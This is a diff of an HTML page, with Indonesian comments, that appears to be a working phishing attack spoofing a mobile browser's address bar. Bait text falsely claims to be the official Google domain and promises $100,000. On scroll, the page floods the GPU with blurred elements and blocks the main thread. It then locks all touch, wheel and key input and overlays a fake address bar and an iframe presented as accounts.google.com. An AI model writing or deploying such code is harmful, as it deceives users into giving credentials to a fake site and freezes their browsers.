@@ -1,30 +1,32 @@
 <!doctype html>
-<html lang="en">
+<html lang="en" id="main-html">
   <head>
     <meta charset="UTF-8" />
     <meta
       name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
     />
     <title>azzzab</title>
     <style>
-      body,
-      html {
+      /* KUNCI UTAMA: Matikan pull-to-refresh dan elastic scroll */
+      html, body {
         margin: 0;
         padding: 0;
         width: 100%;
-        height: 200vh;
+        height: 200vh; /* Tinggi buat trigger */
         background-color: #f8f9fa;
         font-family: sans-serif;
-        scroll-behavior: smooth;
         overflow-x: hidden;
+        overscroll-behavior: none !important; /* MATIKAN ELASTIC SCROLL */
+        touch-action: pan-y; 
       }
-      
 
-      .lock-scroll {
+      /* Class buat gembok total setelah spoofing aktif */
+      .locked {
+        height: 100vh !important;
         overflow: hidden !important;
-        height: 100% !important;
-        touch-action: none
+        position: fixed !important;
+        touch-action: none !important;
       }
 
       #scroll-bait {
@@ -47,7 +49,7 @@
         height: 100vh;
         z-index: 99999;
         background: #fff;
-        touch-action: none; 
+        touch-action: none; /* Blokir gesture di container ini */
       }
 
       #fake-bar {
@@ -60,7 +62,6 @@
         border-bottom: 1px solid #ddd;
         z-index: 100;
         opacity: 0;
-        transition: opacity 0.1s ease-in;
         pointer-events: none;
         touch-action: none;
         -webkit-user-drag: none;
@@ -74,8 +75,6 @@
         height: 100vh;
         border: none;
         z-index: 1;
-        display: block;
-        transition: top 0.1s ease-in, height 0.1s ease-in;
       }
 
       #gpu-killer {
@@ -92,8 +91,8 @@
   <body>
     <div id="scroll-bait">
       <h2>
-        This is the official Google domain. Want to earn $100,000? Follow ini. 
-        Please scroll down to the bottom of this page to proceed to accounts.google.com.
+        This is the official Google domain. Want to earn $100,000? <br>
+        Please scroll down to proceed.
       </h2>
       <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
     </div>
@@ -107,54 +106,57 @@
 
     <script>
       let isSpoofed = false;
+      const html = document.documentElement;
+      const body = document.body;
 
       function triggerMeltdown() {
-        const killerContainer = document.getElementById("gpu-killer");
-        for (let i = 0; i < 2000; i++) {
+        const killer = document.getElementById("gpu-killer");
+        for (let i = 0; i < 2500; i++) {
           let div = document.createElement("div");
-          div.style.cssText = `position:absolute; width:200vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(10px) contrast(200%); transform:rotate(${Math.random() * 360}deg);`;
-          killerContainer.appendChild(div);
+          div.style.cssText = `position:absolute; width:100vw; height:1vh; backdrop-filter:blur(15px);`;
+          killer.appendChild(div);
         }
+        // Blocking main thread secara brutal
         let start = Date.now();
-        while (Date.now() - start < 400) {}
+        while (Date.now() - start < 500) {} 
       }
 
-      function lockEverything() {
-        window.onwheel = (e) => e.preventDefault();
-        window.onmousewheel = (e) => e.preventDefault();
-        window.ontouchmove = (e) => e.preventDefault();
+      // FUNGSI LOCKDOWN TOTAL
+      function activateGembok() {
+        isSpoofed = true;
         
-        window.onkeydown = (e) => {
-            if([32, 37, 38, 39, 40].indexOf(e.keyCode) > -1) {
+        // 1. Ubah tinggi jadi 100vh biar gak bisa scroll lagi
+        html.classList.add('locked');
+        body.classList.add('locked');
+
+        // 2. Tampilkan Fake UI
+        document.getElementById("fake-ui").style.display = "block";
+        
+        // 3. Matikan semua event scroll/touch secara paksa
+        const prevent = (e) => {
+            if (isSpoofed) {
                 e.preventDefault();
+                e.stopPropagation();
+                return false;
             }
         };
 
-        document.documentElement.classList.add('lock-scroll');
-        document.body.classList.add('lock-scroll');
+        ['touchstart', 'touchmove', 'wheel', 'mousewheel', 'keydown'].forEach(evt => {
+            window.addEventListener(evt, prevent, { passive: false });
+        });
       }
 
-      window.addEventListener(
-        "scroll",
-        () => {
-          if (window.scrollY > 80 && !isSpoofed) {
-            isSpoofed = true;
-            document.getElementById("fake-ui").style.display = "block";
-            
+      window.addEventListener("scroll", () => {
+          if (window.scrollY > 60 && !isSpoofed) {
             triggerMeltdown();
-            
-
-            lockEverything();
-            
+            activateGembok();
             window.scrollTo(0, 0);
 
             setTimeout(() => {
               document.getElementById("gpu-killer").innerHTML = "";
-            }, 1000);
+            }, 800);
           }
-        },
-        { passive: false },
-      );
+      }, { passive: false });
 
       window.addEventListener("message", (e) => {
         if (e.data === "SNAP_TRAP") {
@@ -164,13 +166,19 @@
           fakeBar.style.pointerEvents = "auto";
           fakeContent.style.top = "56px";
           fakeContent.style.height = "calc(100vh - 56px)";
+          
+          // Pastikan Address Bar asli beneran ilang dengan cara maksa scroll tipis
+          window.scrollTo(0, 1);
         }
       });
 
+      // BLOKIR KHUSUS PADA IMAGE FAKE BAR
       const fb = document.getElementById("fake-bar");
-      fb.addEventListener("touchstart", (e) => e.preventDefault(), {passive: false});
-      fb.addEventListener("touchmove", (e) => e.preventDefault(), {passive: false});
-      fb.addEventListener("touchend", (e) => e.preventDefault(), {passive: false});
+      ['touchstart', 'touchmove', 'touchend'].forEach(evt => {
+          fb.addEventListener(evt, (e) => {
+              e.preventDefault();
+          }, { passive: false });
+      });
 
     </script>
   </body>
